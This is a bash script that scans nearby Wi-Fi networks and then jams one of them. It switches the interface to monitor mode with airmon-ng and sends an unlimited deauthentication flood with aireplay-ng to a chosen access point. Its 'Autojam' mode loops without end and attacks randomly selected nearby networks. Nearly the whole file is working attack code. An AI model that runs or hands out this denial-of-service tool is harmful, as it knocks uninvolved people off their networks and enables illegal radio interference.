#!/bin/bash

# My global vars
declare -a mac=()
declare -a essid=()
declare -a channel=()
declare -a level=()

scan() {
    while read line; do
        # Reset variables on new network
        if [[ "$line" =~ Cell || "$line" == "" ]] && [[ "$network" ]]; then
	    # Update arrays & clear
	    mac+=($m)
	    essid+=($e)
	    channel+=($chn)
	    level+=($lvl)
            network=""

        fi
        
        if [[ "$line" =~ Address ]]; then
            m=${line##*ss: }
			
        elif [[ "$line" =~ Channel ]]; then
            chn=${line##*nel }
            chn=${chn%?}
			
        elif [[ "$line" =~ Quality ]]; then
            lvl=${line##*evel=}
            lvl=${lvl%% *}

        # The ESSID is the last line of the basic data
        elif [[ "$line" =~ ESSID ]]; then
            e=${line##*ID:}
            network="finished reading"
        fi
			
    done < <(iwlist wlan0 scanning)
}

# Printing the list of wifi's
show() {
    echo "--------------------------------------------------------"
    for i in "${!mac[@]}"; do
        echo "[$i] ${mac[$i]} ${essid[$i]} ${channel[$i]} ${level[$i]}"
    done
}

jam_random() {
	echo "--------------------------------------------------------"
	MAX=${#mac[@]}
	rand_num=$(python -S -c "import random; print random.randrange(0,$MAX)")
	
	echo "[$i] ${mac[$rand_num]} ${essid[$rand_num]} ${channel[$rand_num]} ${level[$rand_num]}"
	jam $rand_num
}

jam_manual() {
    echo "--------------------------------------------------------"
    echo "Type the number of the wifi to jam"
    read i; echo "[$i] ${mac[$i]} ${essid[$i]} ${channel[$i]} ${level[$i]}"
    jam $i
}

jam() {
    
    # Start jamming
    declare -a interfaces=()
    while read line; do
        if [[ $line =~ wlan([0-9]+) ]]; then
            w=${BASH_REMATCH[1]}
            interfaces+=('wlan'$w)
        fi
    done < <(airmon-ng)

    PS3='Please enter your choice of interface: '
    select opt in "${interfaces[@]}"
    do
        interface=$opt
        break
    done
    
    airmon-ng start $interface
    interface+=mon
    sleep 5
    airodump-ng -c ${channel[$1]} --bssid ${mac[$1]} $interface &
    SCANING=$!

    sleep 5
    kill $SCANING
    sleep 2
    
    aireplay-ng -0 0 -a ${mac[$1]} $interface &

    SCANING=$!
    sleep 5
    kill $SCANING
    sleep 2

    airmon-ng stop $interface
    service network-manager start
}


PS3='Please enter your choice: '
options=("Autojam" "Manualjam" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Autojam")
            while :
		do
		    scan
		    jam_random
		done
            ;;
        "Manualjam")
            scan
            show
            jam_manual
            ;;
        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
done
